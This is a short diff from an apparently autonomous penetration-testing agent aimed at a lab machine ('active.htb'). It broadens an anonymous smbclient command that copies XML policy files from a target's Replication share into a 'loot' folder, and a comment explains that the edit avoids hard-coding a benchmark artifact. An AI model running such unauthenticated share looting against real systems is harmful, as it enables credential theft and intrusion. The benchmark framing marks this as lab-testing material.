@@ -448,7 +448,10 @@ class EnterpriseDynamicAgent:
         self.ensure_potential_exploits(scan)
         domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
         if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
-            return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
+            # Generic policy-share acquisition: do not encode a benchmark artifact
+            # name. The reasoning/evidence layer decides which retrieved artifact
+            # is informative after acquisition.
+            return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *.xml'","exploitation","enum.replication")
         # Evidence-first gate: inspect newly retrieved local artifacts before
         # broad remote enumeration. The rule is generic and does not name a target,
         # credential, account, share, or attack path.
